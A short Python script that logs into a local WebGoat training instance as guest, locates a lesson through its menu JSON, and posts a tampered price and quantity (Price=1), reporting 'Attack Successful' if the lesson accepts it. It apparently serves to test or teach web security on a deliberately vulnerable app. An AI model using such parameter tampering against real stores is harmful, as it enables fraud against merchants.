import argparse
import re
import json
import sys
import requests

s = requests.Session()

response = s.get("http://127.0.0.1:8080/WebGoat/login.mvc")

response = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data={'username': 'guest', 'password': 'guest'})

response = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
url = json.loads(response.text)[16].get('children')[1].get('link')


response = s.get("http://127.0.0.1:8080/WebGoat/"+url)

response = s.post("http://127.0.0.1:8080/WebGoat/"+url, data={'QTY': 1, 'Price': 1})

if "Congratulations" in response.text:
  print "Attack Successful"
else:
  print "Passed"
